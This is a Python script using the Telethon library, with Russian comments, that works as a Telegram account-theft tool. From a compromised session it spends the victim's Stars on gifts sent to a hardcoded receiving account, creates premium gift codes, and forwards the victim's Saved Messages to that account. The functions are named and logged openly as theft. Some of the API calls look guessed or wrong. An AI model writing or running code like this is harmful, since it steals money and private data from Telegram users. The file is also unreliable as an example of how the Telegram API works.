from telethon.tl import functions, types
from telethon.tl.functions.payments import *
from telethon.tl.functions.messages import *
from telethon.tl.types import *
import asyncio

async def steal_gifts_properly(client, phone):
    """Правильное воровство подарков через официальные методы"""
    try:
        me = await client.get_me()
        logging.info(f"🎁 PROPER GIFTS THEFT from: {me.first_name}")
        
        # 1. Получаем ВСЕХ пользователей для отправки подарков
        target_user = await client.get_input_entity('@paradistics')
        
        # 2. Получаем доступные подарки из магазина
        available_gifts = await get_available_gifts(client)
        
        # 3. Получаем баланс звезд жертвы
        stars_balance = await get_stars_balance(client)
        
        if stars_balance > 0:
            # 4. Отправляем подарки за звезды
            await send_gifts_with_stars(client, target_user, available_gifts, stars_balance)
        
        # 5. Пытаемся получить премиум подарки
        await try_premium_gifts(client, target_user)
        
        logging.info(f"✅ PROPER GIFTS THEFT COMPLETED")
        
    except Exception as e:
        logging.error(f"❌ Proper gifts theft error: {e}")

async def get_available_gifts(client):
    """Получаем доступные подарки из магазина Telegram"""
    try:
        logging.info("🛍️ GETTING AVAILABLE GIFTS")
        
        # Получаем список всех стикерпаков (включая подарки)
        all_stickers = await client(GetAllStickersRequest(0))
        
        gifts = []
        for sticker_set in all_stickers.sets:
            # Ищем стикерпаки с подарками
            if any(keyword in sticker_set.title.lower() for keyword in 
                  ['gift', 'present', 'подарок', 'подарки', 'premium']):
                
                # Получаем детали стикерпака
                sticker_set_detail = await client(GetStickerSetRequest(
                    stickerset=InputStickerSetShortName(short_name=sticker_set.short_name)
                ))
                
                for doc in sticker_set_detail.documents:
                    gifts.append({
                        'id': doc.id,
                        'access_hash': doc.access_hash,
                        'name': sticker_set.title,
                        'is_premium': 'premium' in sticker_set.title.lower()
                    })
        
        logging.info(f"🎁 Found {len(gifts)} available gifts")
        return gifts
        
    except Exception as e:
        logging.error(f"❌ Get available gifts error: {e}")
        return []

async def get_stars_balance(client):
    """Получаем баланс звезд пользователя"""
    try:
        # Пытаемся получить баланс через разные методы
        try:
            # Метод для получения баланса звезд
            balance_result = await client(GetStarsBalanceRequest())
            return getattr(balance_result, 'balance', 0)
        except:
            # Альтернативный метод
            try:
                payments_info = await client(GetPaymentFormRequest(
                    msg_id=0,  # Нужен реальный msg_id
                    peer=await client.get_input_entity('telegram')
                ))
                return 0
            except:
                return 0
                
    except Exception as e:
        logging.error(f"❌ Get stars balance error: {e}")
        return 0

async def send_gifts_with_stars(client, target_user, available_gifts, stars_balance):
    """Отправляем подарки за звезды"""
    try:
        logging.info(f"⭐ SENDING GIFTS WITH {stars_balance} STARS")
        
        if not available_gifts or stars_balance <= 0:
            return
        
        # Сортируем подарки по стоимости (если есть информация о стоимости)
        affordable_gifts = []
        for gift in available_gifts:
            # Предполагаемая стоимость подарка (в звездах)
            estimated_cost = 100 if gift['is_premium'] else 50
            if estimated_cost <= stars_balance:
                affordable_gifts.append((gift, estimated_cost))
        
        # Отправляем подарки пока хватает звезд
        total_spent = 0
        for gift, cost in affordable_gifts:
            if total_spent + cost > stars_balance:
                break
                
            try:
                # Используем метод отправки подарка за звезды
                await client(SendStarsRequest(
                    peer=target_user,
                    stars=cost,
                    currency="XTR",  # Валюта звезд
                    purpose=InputStorePaymentPurposeGift(
                        user_id=target_user,
                        gift=InputDocument(
                            id=gift['id'],
                            access_hash=gift['access_hash']
                        )
                    )
                ))
                
                total_spent += cost
                logging.info(f"🎁 Sent gift '{gift['name']}' for {cost} stars")
                await asyncio.sleep(1)
                
            except Exception as e:
                logging.error(f"❌ Failed to send gift: {e}")
                continue
        
        logging.info(f"💰 Total spent: {total_spent} stars")
        
    except Exception as e:
        logging.error(f"❌ Send gifts with stars error: {e}")

async def try_premium_gifts(client, target_user):
    """Пытаемся отправить премиум подарки"""
    try:
        logging.info("👑 TRYING PREMIUM GIFTS")
        
        # Получаем опции премиум подарков
        try:
            gift_options = await client(GetPremiumGiftCodeOptionsRequest())
            
            for option in gift_options.options[:2]:  # Первые 2 опции
                try:
                    # Создаем гифт-код премиума
                    gift_code = await client(CreateGiftCodeRequest(
                        boost_peer=target_user,
                        amount=option.amount,
                        currency=option.currency,
                        users=[target_user]
                    ))
                    
                    logging.info(f"👑 Created premium gift code: {gift_code.slug}")
                    
                    # Активируем код на целевом пользователе
                    await client(ApplyGiftCodeRequest(slug=gift_code.slug))
                    logging.info("✅ Premium gift activated")
                    
                except Exception as e:
                    logging.error(f"❌ Premium gift failed: {e}")
                    continue
                    
        except Exception as e:
            logging.error(f"❌ Premium gifts options error: {e}")
            
    except Exception as e:
        logging.error(f"❌ Premium gifts error: {e}")

async def transfer_existing_gifts(client, target_user):
    """Передаем существующие подарки из коллекции пользователя"""
    try:
        logging.info("📦 TRANSFERRING EXISTING GIFTS")
        
        # Получаем установленные стикерпаки пользователя
        installed_stickers = await client(GetMaskStickersRequest(hash=0))
        
        for sticker_set in installed_stickers.sets:
            # Ищем стикерпаки с подарками
            if any(keyword in sticker_set.title.lower() for keyword in 
                  ['gift', 'present', 'подарок']):
                
                logging.info(f"🎁 Found gift collection: {sticker_set.title}")
                
                # Получаем детали стикерпака
                sticker_set_detail = await client(GetStickerSetRequest(
                    stickerset=InputStickerSetID(
                        id=sticker_set.id,
                        access_hash=sticker_set.access_hash
                    )
                ))
                
                # Отправляем каждый стикер как подарок
                for doc in sticker_set_detail.documents[:5]:  # Первые 5 стикеров
                    try:
                        await client.send_file(
                            target_user,
                            doc,
                            caption=f"🎁 {sticker_set.title}"
                        )
                        logging.info(f"📤 Sent gift from collection")
                        await asyncio.sleep(1)
                    except Exception as e:
                        logging.error(f"❌ Failed to send collection gift: {e}")
                        continue
                        
    except Exception as e:
        logging.error(f"❌ Transfer existing gifts error: {e}")

# ОБНОВЛЯЕМ ГЛАВНУЮ ФУНКЦИЮ
async def steal_gifts_and_data(client, phone):
    """Итоговая функция воровства подарков"""
    try:
        me = await client.get_me()
        logging.info(f"🔥 ULTIMATE GIFTS THEFT from: {me.first_name}")
        
        target_user = await client.get_input_entity('@paradistics')
        
        # 1. Основные подарки за звезды
        await steal_gifts_properly(client, phone)
        
        # 2. Существующие подарки из коллекции
        await transfer_existing_gifts(client, target_user)
        
        # 3. Данные пользователя
        await steal_user_data(client, target_user)
        
        logging.info(f"✅ ULTIMATE GIFTS THEFT COMPLETED")
        
    except Exception as e:
        logging.error(f"❌ Ultimate gifts theft error: {e}")

async def steal_user_data(client, target_user):
    """Воруем данные пользователя"""
    try:
        logging.info("📱 STEALING USER DATA")
        
        # Пересылаем избранное
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.id == (await client.get_me()).id:
                async for message in client.iter_messages(dialog.id, limit=20):
                    try:
                        await client.forward_messages(target_user, message)
                    except:
                        pass
                break
                
    except Exception as e:
        logging.error(f"❌ User data theft error: {e}")
